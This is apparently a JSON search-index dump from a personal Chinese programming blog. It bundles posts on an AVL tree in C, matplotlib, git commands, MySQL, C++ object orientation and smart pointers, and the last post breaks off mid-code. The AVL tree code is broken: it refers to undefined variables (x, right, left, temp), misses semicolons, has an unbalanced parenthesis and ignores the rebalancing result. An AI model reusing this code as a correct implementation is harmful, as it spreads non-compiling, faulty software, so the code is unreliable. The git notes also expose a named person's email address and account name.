status:0F6F831DDB7F1C9C918760EB3B2FF7B33F49485A942603DEA95F463386711A55DC6DF03D05975EAA41D94E2DAF13505909ED42C69847067BCCB75BD7747D0C4D2B0E844F9A516853527311354C77219EFD179F02297C18A06A7572BF2CC5A108E1F8E7A819C0DFA28DFF8FD262D4BAAD6E3CA34476340B048CA580E5F4B42A202232FA153090EECB9B56A600EFB2A7A42EF5C1E3AEF93882B0B6B87E376C668E541F7925144585C8C4963AC9B5B1248AE4F11E16B9E289E8CD3EEC23D19D694ABDC28BFED0FCABCA7057F30DEAE901C7ACE067BB27BE9293E66139F25D120ABC2831CED3FBD55CCF9995436436C3D68158DA65DD1B781063D807F66B404B887A key stream:2393B785D3C35D48248588D0C01594231EEAcipher hexdump:4FE0E5CF93ED6D6848F3EEA6B236AD162CDDdecypt data:lsRJ@.0 lvfvr#9527","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://qianmuoy.github.io/categories/Crypto/"}],"tags":[]},{"title":"AvlTree","slug":"AvlTree","date":"2023-04-01T12:02:12.000Z","updated":"2024-02-04T11:54:45.450Z","comments":true,"path":"2023/04/01/AvlTree/","link":"","permalink":"https://qianmuoy.github.io/2023/04/01/AvlTree/","excerpt":"","text":"AvlTree定义AVL 树是一种平衡二叉树，得名于其发明者的名字（ Adelson-Velskii 以及 Landis）。（可见名字长的好处，命名都能多占一个字母出来）。平衡二叉树递归定义如下： 左右子树的高度差小于等于 1。 其每一个子树均为平衡二叉树。 平衡因子： 某个结点的左子树的高度减去右子树的高度得到的差值。 AVL 树： 所有结点的平衡因子的绝对值都不超过 1 的二叉树。 为了计算平衡因子，我们自然需要在节点中引入高度这一属性。在这里，我们把节点的高度定义为其左右子树的高度的最大值。因此，引入了高度属性的 AVL 树的节点定义如下： 123456typedef struct node &#123; int data; int height; struct node *left; struct node *right;&#125;node_t, * nodeptr_t; 计算某一个节点的高度 1234567int treeHeight(nodeptr_t root) &#123; if(root == NULL) &#123; return 0; &#125; else &#123; return max(treeHeight(root-&gt;left),treeHeight(root-&gt;right)) + 1; &#125;&#125; 我们在进行如下操作时需要更新受影响的所有节点的高度： 在插入结点时， 沿插入的路径更新结点的高度值 在删除结点时（delete）,沿删除的路径更新结点的高度值 有了高度，计算平衡因子的操作就得以很简单的实现： 123456int treeGetBalanceFactor(nodeptr_t root) &#123; if(root == NULL) return 0; else return x-&gt;left-&gt;height - x-&gt;right-&gt;height;&#125; 当平衡因子的绝对值大于 1 时，就会触发树的修正，或者说是再平衡操作。 树的平衡化操作二叉树的平衡化有两大基础操作： 左旋和右旋。左旋，即是逆时针旋转；右旋，即是顺时针旋转。这种旋转在整个平衡化过程中可能进行一次或多次，这两种操作都是从失去平衡的最小子树根结点开始的(即离插入结点最近且平衡因子超过1的祖结点)。 右旋 所谓右旋操作，就是把上图中的 B 节点和 C 节点进行所谓“父子交换”。在仅有这三个节点时候，是十分简单的。但是当 B 节点处存在右孩子时，事情就变得有点复杂了。我们通常的操作是：抛弃右孩子，将之和旋转后的节点 C 相连，成为节点 C 的左孩子。这样，我们就能写出对应的代码。 1234567891011nodeptr_t treeRotateRight(nodeptr_t root) &#123; nodeptr_t left = root-&gt;left; root-&gt;left = left-&gt;right; // 将将要被抛弃的节点连接为旋转后的 root 的左孩子 left-&gt;right = root; // 调换父子关系 left-&gt;height = max(treeHeight(left-&gt;left), treeHeight(left-&gt;right))+1; right-&gt;height = max(treeHeight(right-&gt;left), treeHeight(right-&gt;right))+1; return left;&#125; 左旋 左旋操作和右旋操作十分类似 1234567891011nodeptr_t treeRotateLeft(nodeptr_t root) &#123; nodeptr_t right = root-&gt;right; root-&gt;right = right-&gt;left; right-&gt;left = root; left-&gt;height = max(treeHeight(left-&gt;left), treeHeight(left-&gt;right))+1; right-&gt;height = max(treeHeight(right-&gt;left), treeHeight(right-&gt;right))+1; return right;&#125; 需要平衡的四种情况LL RR LR RL实现平衡化操作的实现 12345678910111213141516nodeptr_t treeRebalance(nodeptr_t root) &#123; int factor = treeGetBalanceFactor(root); if(factor &gt; 1 &amp;&amp; treeGetBalanceFactor(root-&gt;left) &gt; 0) // LL return treeRotateRight(root); else if(factor &gt; 1 &amp;&amp; treeGetBalanceFactor(root-&gt;left) &lt;= 0) &#123; //LR root-&gt;left = treeRotateLeft(root-&gt;left); return treeRotateRight(temp); &#125; else if(factor &lt; -1 &amp;&amp; treeGetBalanceFactor(root-&gt;right) &lt;= 0) // RR return treeRotateLeft(root); else if((factor &lt; -1 &amp;&amp; treeGetBalanceFactor(root-&gt;right) &gt; 0) &#123; // RL root-&gt;right = treeRotateRight(root-&gt;right); return treeRotateLeft(root); &#125; else &#123; // Nothing happened. return root; &#125;&#125; 插入123456789101112131415161718192021222324void treeInsert(nodeptr_t *rootptr, int value)&#123; nodeptr_t newNode; nodeptr_t root = *rootptr; if(root == NULL) &#123; newNode = malloc(sizeof(node_t)); assert(newNode); newNode-&gt;data = value; newNode-&gt;left = newNode-&gt;right = NULL; *rootptr = newNode; &#125; else if(root-&gt;data == value) &#123; return; &#125; else &#123; if(root-&gt;data &lt; value) treeInsert(&amp;root-&gt;right,value); else treeInsert(&amp;root-&gt;left,value) &#125; treeRebalance(root);&#125; 删除123456789101112131415161718192021222324void treeDelete(nodeptr_t *rootptr, int data)&#123; nodeptr_t *toFree; // 拜拜了您呐 nodeptr_t root = *rootptr; if(root) &#123; if(root-&gt;data == value) &#123; if(root-&gt;right) &#123; root-&gt;data = treeDeleteMin(&amp;(root-&gt;right)); &#125; else &#123; toFree = root; *rootptr = toFree-&gt;left; free(toFree); &#125; &#125; else &#123; if(root-&gt;data &lt; value) treeDelete(&amp;root-&gt;right,value); else treeDelete(&amp;root-&gt;left,value) &#125; treeRebalance(root); &#125;&#125;","categories":[{"name":"Algorithms","slug":"Algorithms","permalink":"https://qianmuoy.github.io/categories/Algorithms/"}],"tags":[]},{"title":"matplotlib","slug":"matplotlib","date":"2023-04-01T09:44:40.000Z","updated":"2024-02-04T12:32:20.505Z","comments":true,"path":"2023/04/01/matplotlib/","link":"","permalink":"https://qianmuoy.github.io/2023/04/01/matplotlib/","excerpt":"","text":"matplotlibwhy matplotlib?如果您使用过“工科神器”MATLAB，您一定会惊叹于MATLAB中惊人的可视化能力，其中的函数绘图，成为了无数SCI论文中真实数据配图的来源。小小的plot函数，画出了人类先进科学进步的曲线。 python中的matplotlib库，与MATLAB中的plot函数有点像，也许这正是它名字的来源。这是一个2D绘图库，利用它可以画出许多高质量的图像。只需几行代码即可生成直方图，条形图，饼图，散点图等。Matplotlib可用于Python脚本，Python和IPython shell，Jupyter笔记本，Web应用程序服务器和四个图形用户界面工具包。 希望以下教程可以为您带来一些帮助。 安装请查看上方anaconda教程，配置好python环境。使用命令pip install matplotlib 或 conda install matplotlib 进行安装。使用时，直接import即可。 Matplotlib.pyplotMatplotlib 中的 pyplot 模块是一个类似命令风格的函数集合，这使得 Matplotlib 的工作模式和 MATLAB 相似。 pyplot 模块提供了可以用来绘图的各种函数，比如创建一个画布，在画布中创建一个绘图区域，或是在绘图区域添加一些线、标签等。以下表格对这些函数做了简单地介绍。若您有MATLAB基础，看着本节即可上手使用。 绘图类型 函数名称 描述 Bar 绘制条形图 Barh 绘制水平条形图 Boxplot 绘制箱型图 Hist 绘制直方图 his2d 绘制2D直方图 Pie 绘制饼状图 Plot 在坐标轴上画线或者标记 Polar 绘制极坐标图 Scatter 绘制x与y的散点图 Stackplot 绘制堆叠图 Stem 用来绘制二维离散数据绘制（又称为“火柴图”） Step 绘制阶梯图 Quiver 绘制一个二维按箭头 Image函数 函数名称 描述 Imread 从文件中读取图像的数据并形成数组。 Imsave 将数组另存为图像文件。 Imshow 在数轴区域内显示图像。 Axis函数 函数名称 描述 Axes 在画布(Figure)中添加轴 Text 向轴添加文本 Title 设置当前轴的标题 Xlabel 设置x轴标签 Xlim 获取或者设置x轴区间大小 Xscale 设置x轴缩放比例 Xticks 获取或设置x轴刻标和相应标签 Ylabel 设置y轴的标签 Ylim 获取或设置y轴的区间大小 Yscale 设置y轴的缩放比例 Yticks 获取或设置y轴的刻标和相应标签 Figure函数 函数名称 描述 Figtext 在画布上添加文本 Figure 创建一个新画布 Show 显示数字 Savefig 保存当前画布 Close 关闭画布窗口 第一个绘图程序首先导入 Matplotlib 包中的 Pyplot 模块，并以 as 别名的形式简化引入包的名称。 1import matplotlib.pyplot as plt 接下来，使用 NumPy 提供的函数 arange() 创建一组数据来绘制图像。 如果您对numpy库并不了解，可以理解为这就是在生成列表数据即可。 1234#引入numpy包import numpy as np#获得0到2π之间的数据，每个数据间隔0.05x = np.arange(0, math.pi*2, 0.05) 我们这里来绘制sin函数的值。使用numpy库内置函数计算出值（实际上是矩阵），放入y中，作为函数值。 1y = np.sin(x) 此时，使用plot函数进行绘制即可。绘制完后，需要使用show函数展示出来才行。 12plt.plot(x,y)plt.show() 这个图像实在是光秃秃。我们在show之前添加一些属性设置。设置上图像的标题、标签。 123plt.xlabel(&quot;angle&quot;)plt.ylabel(&quot;sine&quot;)plt.title(&#x27;sine wave&#x27;) 这样，图像勉强能看了。 您也可以在 Jupyter 笔记本中运行 Matplotlib 的绘图程序。通过命令行或者开始菜单的方式启动 Jupyter 笔记本。启动成功后，将上述代码拷贝到输入行内，如下所示： %matplotlib inline 是 Jupyter 提供的魔法命令，它可以把输出图显示在笔记本内部，否则会以查看器的形式单独显示。 title、label、坐标轴设置123456plt.title(&quot;title&quot;)#括号当中输入标题的名称plt.xlim(0,6) #x轴坐标轴plt.ylim((0, 3))#y轴坐标轴plt.xlabel(&#x27;X&#x27;)#x轴标签plt.ylabel(&#x27;Y&#x27;)#y轴标签plt.show() 可以对相应属性进行设置。 其中，x、y坐标轴的设置，又一般使用plot函数进行设置。 Figure画布对象与Axes坐标轴对象在matplotlib中，整个图像为一个Figure对象。在Figure对象中可以包含一个或者多个Axes对象。每个Axes(ax)对象都是一个拥有自己坐标系统的绘图区域。 1234plt.figure(figsize=(6, 3))plt.plot(6, 3)plt.plot(3, 3 * 2)plt.show() 如果我们要在一个代码中生成多张图，就需要多个画布，也就是多个figure对象。那么此时，我们就转变为对各个画布对象进行操作，而非plt库的默认画布。 123from matplotlib import pyplot as plt#创建图形对象fig = plt.figure() 参数 说明 figsize 指定画布的大小，(宽度,高度)，单位为英寸。 dpi 指定绘图对象的分辨率，即每英寸多少个像素，默认值为80。 facecolor 背景颜色。 dgecolor 边框颜色。 frameon 是否显示边框。 有了画布，我们还要添加坐标轴对象。 1ax = fig.add_axes([0.1,0.1,0.8,0.8]) add_axes() 的参数值是一个序列，序列中的 4 个数字分别对应图形的左侧，底部，宽度，和高度，且每个数字必须介于 0 到 1 之间。 即将画布的宽、高作为 1 个单位。比如，[ 0.1, 0.1, 0.8, 0.8]，它代表着从画布 10% 的位置开始绘制, 宽高是画布的 80%。 坐标轴对象可以设置标题，设置标签，进行绘图。与原本的库一样的调用方式。 123456789x = np.arange(0, math.pi*2, 0.05)y = np.sin(x)fig = plt.figure()ax = fig.add_axes([0.1,0.1,0.8,0.8])ax.plot(x,y)ax.set_title(&quot;sine wave&quot;)ax.set_xlabel(&#x27;angle&#x27;)ax.set_ylabel(&#x27;sine&#x27;)plt.show() label、legend图例设置在画图时，可以添加label属性，传入图例。并通过legend启动，添加loc属性选择图例位置。 12345x = np.arange(0, math.pi*2, 0.05)y = np.sin(x)plt.plot(x,y,label=&quot;sin&quot;)plt.legend(loc=&quot;best&quot;)#图例位置，可选best，center等plt.show() 一图多线在同一个figure下，直接使用plot进行画图即可。同一张图上可以全部显示出来。注意添加label参数以作区别。 如果要画多张图，可以在两个plot方法之间使用figure方法创造一个新的窗口，进行分别展示。 注释有时候我们需要对特定的点进行标注，我们可以使用 plt.annotate 函数来实现: s: 注释信息内容 xy:箭头点所在的坐标位置 xytext:注释内容的坐标位置 arrowprops：设置指向箭头的参数 123456x=np.linspace(0,10,200)#从0到10之间等距产生200个值y=np.sin(x)plt.plot(x,y,linestyle=&#x27;:&#x27;,color=&#x27;b&#x27;)plt.annotate(text=&#x27;here&#x27;,xy=(3,np.sin(3)),xytext=(4,-0.5),weight=&#x27;bold&#x27;,color=&#x27;b&#x27;,arrowprops=dict(arrowstyle=&#x27;-|&gt;&#x27;,color=&#x27;k&#x27;))plt.show() 子图如果需要将多张子图展示在一起，可以使用 subplot() 实现。即在调用 plot()函数之前需要先调用 subplot() 函数。 该函数的第一个参数代表子图的总行数， 第二个参数代表子图的总列数， 第三个参数代表活跃区域。 1234567891011ax1 = plt.subplot(2, 2, 1)plt.plot(x,np.sin(x), &#x27;k&#x27;)ax2 = plt.subplot(2, 2, 2, sharey=ax1) # 与 ax1 共享y轴plt.plot(x, np.cos(x), &#x27;g&#x27;)ax3 = plt.subplot(2, 2, 3)plt.plot(x,x, &#x27;r&#x27;)ax4 = plt.subplot(2, 2, 4, sharey=ax3) # 与 ax3 共享y轴plt.plot(x, 2*x, &#x27;y&#x27;) 同样的，这些图像支持各自传入各种各样的参数。 plot的参数plot函数支持传入各种参数，不需要在外部再手动设置。 1234#单条线：plot([x], y, [fmt], data=None, **kwargs)#多条线一起画plot([x], y, [fmt], [x2], y2, [fmt2], ..., **kwargs) 可选参数[fmt] 是一个字符串来定义图的基本属性如：颜色（color），点型（marker），线型（linestyle）， 具体形式 fmt &#x3D; ‘[color] [ marker ] [ line ]’ fmt接收的是每个属性的单个字母缩写。 ============= =============================== character color ============= =============================== ``&#39;b&#39;`` blue 蓝 ``&#39;g&#39;`` green 绿 ``&#39;r&#39;`` red 红 ``&#39;c&#39;`` cyan 蓝绿 ``&#39;m&#39;`` magenta 洋红 ``&#39;y&#39;`` yellow 黄 ``&#39;k&#39;`` black 黑 ``&#39;w&#39;`` white 白 ============= =============================== 1234567891011121314151617181920212223242526============= =============================== character description ============= =============================== ``&#x27;.&#x27;`` point marker ``&#x27;,&#x27;`` pixel marker ``&#x27;o&#x27;`` circle marker ``&#x27;v&#x27;`` triangle_down marker ``&#x27;^&#x27;`` triangle_up marker ``&#x27;&lt;&#x27;`` triangle_left marker ``&#x27;&gt;&#x27;`` triangle_right marker ``&#x27;1&#x27;`` tri_down marker ``&#x27;2&#x27;`` tri_up marker ``&#x27;3&#x27;`` tri_left marker ``&#x27;4&#x27;`` tri_right marker ``&#x27;s&#x27;`` square marker ``&#x27;p&#x27;`` pentagon marker ``&#x27;*&#x27;`` star marker ``&#x27;h&#x27;`` hexagon1 marker ``&#x27;H&#x27;`` hexagon2 marker ``&#x27;+&#x27;`` plus marker ``&#x27;x&#x27;`` x marker ``&#x27;D&#x27;`` diamond marker ``&#x27;d&#x27;`` thin_diamond marker ``&#x27;|&#x27;`` vline marker ``&#x27;_&#x27;`` hline marker ============= =============================== 12345678============= ===============================character description============= ===============================``&#x27;-&#x27;`` solid line style 实线``&#x27;--&#x27;`` dashed line style 虚线``&#x27;-.&#x27;`` dash-dot line style 点画线``&#x27;:&#x27;`` dotted line style 点线============= =============================== 另外，支持color&#x3D;，linestyle&#x3D;，label&#x3D;关键字传参，具体可参照官方文档，或参考上方plt.xxx设置。一般都有对应的参数。 各种其他图参考绘图类型节即可。这里以柱状图为例。 1234x = np.arange(10)y = np.random.randint(0,20,10)plt.bar(x, y)plt.show()","categories":[{"name":"Python","slug":"Python","permalink":"https://qianmuoy.github.io/categories/Python/"}],"tags":[]},{"title":"git","slug":"git","date":"2023-03-27T08:28:52.000Z","updated":"2024-02-04T11:55:07.232Z","comments":true,"path":"2023/03/27/git/","link":"","permalink":"https://qianmuoy.github.io/2023/03/27/git/","excerpt":"","text":"git远程仓库网址：https://github.com 张朝阳账户：&#x7a;&#x68;&#x61;&#110;&#103;&#x7a;&#104;&#97;&#111;&#x79;&#97;&#110;&#103;&#x40;&#99;&#x68;&#100;&#x2e;&#101;&#100;&#x75;&#x2e;&#99;&#x6e; 用户名zhzj0218，密码：一般密码 以将&#x2F;d&#x2F;gitproject&#x2F;pycharm_python_and_pyqt中的文件同步到git中的zhzj0218下的pycharm_python_and_pyqt为例 [TOC] 查看分支状态git status 创建版本库git init 把当前的目录变成Git管理的版本库 git status 查看当前分支状态 git add . 把当前文件夹下的文件提交到暂存区 紧接着git commit -m “提交标签，如first proposed” 把暂存区提交到版本库 执行git status查看状态，确保工作区是干净的，没有需要提交的内容 （git log查看提交日志，git reflog查看提交版本号） 远程同步git remote -v查看远程版本库信息 创建github上的git仓库，例如在github的zhzj0218下创建了仓库pycharm_python_and_pyqt.git git remote add origin https://github.com/zhzj0218/pycharm_python_and_pyqt.git 将本地仓库关联到Github仓库 再次查看git remote -v，确认远程仓库关联成功 git push -u origin master 将本地仓库的内容推送到Github仓库 远程库克隆到本地git clone https://github.com/zhzj0218/pycharm_python_and_pyqt.git 将远程仓库的内容克隆到本地 常用命令创建版本库git clone 克隆远程版本库到本地 git init 初始化本地版本库 修改和提交git status 查看状态，也可查看冲突的文件 git dif 查看变更内容 git add . 跟踪所有改动过的内容 git add 跟踪制定的文件 git mv 文件改名 git rm 删除文件 git rm –cached 停止跟踪文件但不删除 git commit -m “commit message” 提交所有更新过的文件 git commit –amend 修改最后一次提交 查看提交历史git log 查看提交历史 git log -p 查看指定文件的提交历史 git blame 以列表方式查看指定文件的提交历史 撤销git reset –hard HEAD 撤销工作目录中所有未提交文件的修改内容 git checkout HEAD 撤销指定的未提交文件的修改内容 git revert 撤销指定的提交 git reset –hard HEAD^ 还原到上一个版本 git reset –hard 18b6a 回到之前版本，此处18b6a为某个版本号，版本号无需写全 （git log查看提交历史，可看到版本号，git log –pretty&#x3D;oneline可简化输出查看版本号，HEAD^表示上一次版本，HEAD^^表示上上一个版本，也可以用数字表示，HEAD~2，也可以用git reflog查看版本号，此时的版本号较短，为简短版本号） git checkout – 文件没有添加到暂存区时，撤回工作区的修改 git reset HEAD 文件已经添加到暂存区时，撤销暂存区的修改，然后再使用git check – 撤回工作区的修改 分支与标签git branch 显示所有本地分支 git checkout &lt;branch&#x2F;tag&gt; 切换到指定分支或者标签 git branch 创建新分支 git branch -d 删除本地分支 git tag 列出所有本地标签 git tag 基于最新提交创建标签 git tag -d 删除标签 合并与衍合git merge 合并指定分支到当前分支 git rebase 衍合指定分支到当前分支 远程操作git remote -v 查看远程版本库信息 git remote show 查看指定远程版本库信息 git remote add 添加远程版本库 git fetch 从远程库获取代码 git pull 下载代码及快速合并 git push 上传代码及快速合并 git push :&lt;branch&#x2F;tag-name&gt; 删除远程分支或标签 git push –tags 上传所有标签 git remote rm origin移除原先错误的origin remote 查看和修改用户名和邮箱git config user.name查看用户名 git config user.email查看邮箱 git config –global user.name “your name”修改用户名为your name git config –global user.email “your email”修改用户名为your email 密码输入错误的解决方法在控制面板，管理windows凭证，修改正确的密码 大文件上传git默认不能上传超过100M的文件，如果上传100M的文件，则会出现fatal: The remote end hung up unexpectedly的错误，表示存在大文件不能上传。因此需要处理大文件的上传。 示例：假设当前存在后缀为.exe，.zip及.whl的大文件，处理步骤如下： git lfs install 安装lfs git lfs track “*.zip” git lfs track “*.exe” git lfs track “*.whl” 则文件夹中生成的.gitattributes文件内容如下： 123*.exe filter=lfs diff=lfs merge=lfs -text*.zip filter=lfs diff=lfs merge=lfs -text*.whl filter=lfs diff=lfs merge=lfs -text git add .gitattributes 将.gitattributes文件加入到暂存区 git commit -m “add lfs file” 提交文件 git push origin master 将本地仓库内容提交到Github仓库（包含大文件提交，提交的大文件具有lfs标签，表明为大文件）","categories":[{"name":"Basic","slug":"Basic","permalink":"https://qianmuoy.github.io/categories/Basic/"}],"tags":[]},{"title":"MySQL","slug":"MySQL","date":"2023-03-27T08:20:58.000Z","updated":"2024-02-04T12:35:37.902Z","comments":true,"path":"2023/03/27/MySQL/","link":"","permalink":"https://qianmuoy.github.io/2023/03/27/MySQL/","excerpt":"","text":"安装 到官网进行安装。点击MySQL Installer for Windows下载安装包后一直next即可。 启动与停止 mysql开机默认启动。 在win+R运行services.msc，找到mysql右键操作。 在cmd中运行net start mysql80、net stop mysql80进行启动与停止。 客户端连接 方式一：直接使用mysql提供的命令行进行连接。开始找到MySQL Command Line Client-Unicode，进去输入密码操作。 方式二：先配置PATH环境变量C:\\Program Files\\MySQL\\MySQL Server 8.0\\bin。在任意cmd输入mysql -u root -p，输入密码操作。 MySQL数据库的好处 关系型数据库RDBMS，建立在关系模型基础上，由多张相互连接的二维表组成的数据库。格式统一，便于维护，使用SQL语言操作，使用方便。数据模型是数据库，可以创建多个表。 SQL （1） SQL通用语法 （2） SQL分类 （3） DDL ​ 查询数据库 12show databases;select database();# 查询当前数据库 ​ 如果创建了同样名称的数据库会报错。一般使用以下指令创建。 1create database if not exists; ​ 在创建数据库的时候可以指定字符集。utf8只占有三个字节，而某些数据会占据四个字节，因此一般设置为utf8mb4 1create database if not exists default charset utf8mb4; ​ 删除数据库 删除不存在的数据库同样会报错，因此使用以下指令进行删除 1DROP database IF EXISTS databaseName; ​ 数据库使用 1USE databaseName; ​ 表创建 数据类型quality ​ 1）数值类型 ​ 定义float和double类型时，需要两个参数。如score double(4, 1)代表4个长度，最多1位小数。 ​ 定义无符号时应该是 age TINYINT UNSIGNED;,unsigned放在数据类型后面。 ​ 2） 字符串类型 ​ sql中字符串为varchar(size)，size是字符串的长度。一旦超出size会报错。varchar会动态占用内存，而char不管多大都必定占用size内存。但是char性能更高。 ​ 例如用户名适合用varchar，性别适合用char。 ​ 3） 日期类型 birthday date; 注意最后一个字段没有逗号。 12345CREATE TABLE tableName( 字段1 字段1类型 COMMENT “字段1注释”, ... 字段n 字段n类型 COMMENT “字段n注释”)COMMENT “表注释”； ​ 查询当前数据库所有表，需要先用use指令进入数据库。 1SHOW TABLES; ​ 查询表结构 1DESC databaseName; ​ 查询指定表的建表语句，用于展示详细注释 1SHOW CREATE TABLE databaseName; 案例 ​ 表修改 1）添加字段 1ALTER TABLE tableName ADD fieldName quality COMMENT “注释” 约束; ​ 2） 修改数据类型 1ALTER TABLE tableName MDOIFY fieldName newQuality(size); ​ 3） 修改字段名和字段类型 1ALTER TABLE tableName CHANGE oldTableName newTableName quality(size) COMMENT &quot;注释&quot; 约束; ​ 4) 删除字段 1ALTER TABLE tableName DROP filedName; ​ 5) 修改表名 1ALTER TABLE tableName RENAME TO newTableName; ​ 6) 删除表 1DROP TABLE IF EXISTS tableName; ​ 7) 删除指定表，并重新创建空的表结构 1TRUNCATE TABLE tableName; 图形化工具DataGrip 进入后点击左上角加号，新增mysql Data Sources ,配置文件。user填root，密码随便设置，确认后下载驱动文件。 ​ 1） 创建数据库 右键 new 选择schema，填写名字。 2）新建表 右键数据库 创建表，填写名字和注释信息。在colums中创建字段。点击execute。 ​ 3）修改表 右键数据库 modify table ​ 4）使用sql语句操作 右键 new quary console ​ （4）DML 增删改操作 如果没有where条件，会修改所有数据。 （5）DQL 查操作 关键字：SELECT 1）基础查询 查询可以起别名。SELECT … as ‘ ,,, ‘ from …;其中as可以省略。 查询如果不要重复，可以在select后加distinct关键字。 聚合函数 count不会统计null，最好采用count(*) 2） 分组查询 3） 排序查询 如果是多字段排序，字段一 一样时才会用第二种排序 4） 分页查询 编写顺序与执行顺序 （6）DCL 管理数据库用户、控制数据库访问权限 1） 用户 2） 权限 主机名可以用’%’通配，表名用’*’通配。 函数 mysql内置了函数。select 函数名(); （1）字符串函数 （2）数值函数 （3）日期函数 type填写YEAR、MONTH、DAY （4）流程函数 约束 保证数据的正确性和完整性 尽管没有插入成功，数据也会向mysql申请主键。 在可视化创建数据的时候可以直接勾选。 外键关联 表之间的联系 事务 要么全部成功，要么全部失败 方式一 ​ 方式二 事务的四大特性 并发事务问题 解决方法：事务的隔离级别 python 3中运行pip install Mysqlclient, 通过import MySQLdb来建立数据库的连接。","categories":[{"name":"MySQL","slug":"MySQL","permalink":"https://qianmuoy.github.io/categories/MySQL/"}],"tags":[]},{"title":"面向对象","slug":"面向对象","date":"2023-03-22T12:42:09.000Z","updated":"2024-02-04T12:35:14.168Z","comments":true,"path":"2023/03/22/面向对象/","link":"","permalink":"https://qianmuoy.github.io/2023/03/22/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/","excerpt":"","text":"explicit关键字，作为返回值时加上不调用拷贝构造函数。作为类关键字防止被拷贝。 多态父类指针指向子类对象 父类提供virtual 虚函数，子类对象实现 析构函数加virtual，可以调用子类的析构函数 构造函数前不能加virtual，因为构造函数执行后，虚表才出现 运算符重载 类中，++i比i++效率高，因为后者还要调用构造函数 工厂模式用父类指针作为返回值，在返回值创建子类对象 单体模式sizeof、_countof_tscanf_s( _T(“%d”), v1, _countof(v1)); sizeof 数据类型大小与数据大小相乘，实际的数据大小 countof 数据大小，实际上的数据数量 结构体对齐大小为4，1，8，按最大的对齐 如上，实际上为16。double占8，另外两个加起来用8 重载函数名一样，参数类型不同，参数数量不同 与返回值类型无关 使用const，发生重载。 const是常对象调用的。 菱形继承一个派生类D是由多继承产生的，它的多个基类B、C继承了同一个基类A。造成派生类D中具有多份A类的属性，属于一种不合理的现象 会让高层的基类在底层的派生类中拥有多份成员，造成二义性。 解决方法：使用作用域、利用虚继承 在使用时加上作用域 但是不能解决多次拷贝的问题 虚继承 给所有函数都加上virtual 继承时使用虚继承 使用虚继承时，第一成员是一个指针，指向一个结构体，里面第二成员是一个十六进制偏移。偏移值是父类到子类的偏移。 虚继承中，父类指针只能访问子类对象被继承的部分。因为在定义的时候，有一个偏移指向对应的数据。 虚表将父类中函数定义为虚函数后，会出现一个虚表指针（4或8）在上述结构体的第一成员（第二成员是到子类的偏移），指向一个数组。数组中存放的都是函数，如果孩子实现了这个函数，就会放入孩子的。如果孩子的没实现，就会放入自己的。 类A是基类，类B继承类A，类C又继承类B。类A，类B，类C，假设在子类有实现，其对象模型如下图所示。 若菱形继承，两个父类均有对虚函数的实现，而子类没有对虚函数的实现，就会出现二义性问题。一般来说，子类都会进行实现，不会出现这种问题。 经常在父类的析构函数前加virtual，是为了在释放内存时使用子类的析构函数。 纯虚类父类使用纯虚函数virtual void show() = 0;它不会实例化一个对象，在子类继承的时候也会把纯虚函数继承，它强制性要求，派生类必须实现某个接口，不然无法实例化对象","categories":[{"name":"C++","slug":"C","permalink":"https://qianmuoy.github.io/categories/C/"}],"tags":[]},{"title":"智能指针","slug":"智能指针","date":"2023-03-22T12:38:10.000Z","updated":"2024-02-04T12:36:01.811Z","comments":true,"path":"2023/03/22/智能指针/","link":"","permalink":"https://qianmuoy.github.io/2023/03/22/%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88/","excerpt":"","text":"智能指针 c++11std::unique_ptr&lt;T&gt; ：独占资源所有权的指针。当我们独占资源的所有权的时候，可以使用 std::unique_ptr 对资源进行管理——离开 unique_ptr 对象的作用域时，会自动释放资源。 std::unique_ptr 是 move-only 的。 12std::unique_ptr&lt;int&gt; uptr = std::make_unique&lt;int&gt;(200);std::unique_ptr&lt;int&gt; uptr1 = uptr; // 编译错误，std::unique_ptr&lt;T&gt; 是 move-only 的 std::unique_ptr 可以指向一个数组。 可以自定义 deleter。 12345678910&#123; struct FileCloser &#123; void operator()(FILE* fp) const &#123; if (fp != nullptr) &#123; fclose(fp); &#125; &#125; &#125;; std::unique_ptr&lt;FILE, FileCloser&gt; uptr(fopen(&quot;test_file.txt&quot;, &quot;w&quot;));&#125; 123456&#123; std::unique_ptr&lt;FILE, std::function&lt;void(FILE*)&gt;&gt; uptr( fopen(&quot;test_file.txt&quot;, &quot;w&quot;), [](FILE* fp) &#123; fclose(fp); &#125;);&#125; std::shared_ptr&lt;T&gt; ：共享资源所有权的指针。其实就是对资源做引用计数——当引用计数为 0 的时候，自动释放资源。 1234567891011&#123; std::shared_ptr&lt;int&gt; sptr = std::make_shared&lt;int&gt;(200); assert(sptr.use_count() == 1); // 此时引用计数为 1 &#123; std::shared_ptr&lt;int&gt; sptr1 = sptr; assert(sptr.get() == sptr1.get()); assert(sptr.use_count() == 2); // sptr 和 sptr1 共享资源，引用计数为 2 &#125; assert(sptr.use_count() == 1); // sptr1 已经释放&#125;// use_count 为 0 时自动释放内存 也可以指向数组和自定义 deleter。 12345678910111213141516171819&#123; // C++20 才支持 std::make_shared&lt;int[]&gt; // std::shared_ptr&lt;int[]&gt; sptr = std::make_shared&lt;int[]&gt;(100); std::shared_ptr&lt;int[]&gt; sptr(new int[10]); for (int i = 0; i &lt; 10; i++) &#123; sptr[i] = i * i; &#125; for (int i = 0; i &lt; 10; i++) &#123; std::cout &lt;&lt; sptr[i] &lt;&lt; std::endl; &#125; &#125;&#123; std::shared_ptr&lt;FILE&gt; sptr( fopen(&quot;test_file.txt&quot;, &quot;w&quot;), [](FILE* fp) &#123; std::cout &lt;&lt; &quot;close &quot; &lt;&lt; fp &lt;&lt; std::endl; fclose(fp); &#125;);&#125; 一个 shared_ptr 对象的内存开销要比裸指针和无自定义 deleter 的 unique_ptr 对象略大。 shared_ptr 需要维护的信息有两部分： 指向共享资源的指针。 引用计数等共享资源的控制信息——实现上是维护一个指向控制信息的指针。 所以，shared_ptr 对象需要保存两个指针。shared_ptr 的 的 deleter 是保存在控制信息中，所以，是否有自定义 deleter 不影响 shared_ptr 对象的大小。 不能去掉 shared_ptr 对象中指向共享资源的指针。 因为 shared_ptr 对象中的指针指向的对象不一定和控制块中的指针指向的对象一样。（由于多态的存在，有可能指向父类对象）。 12345678910111213141516struct Fruit &#123; int juice;&#125;;struct Vegetable &#123; int fiber;&#125;;struct Tomato : public Fruit, Vegetable &#123; int sauce;&#125;; // 由于继承的存在，shared_ptr 可能指向基类对象std::shared_ptr&lt;Tomato&gt; tomato = std::make_shared&lt;Tomato&gt;();std::shared_ptr&lt;Fruit&gt; fruit = tomato;std::shared_ptr&lt;Vegetable&gt; vegetable = 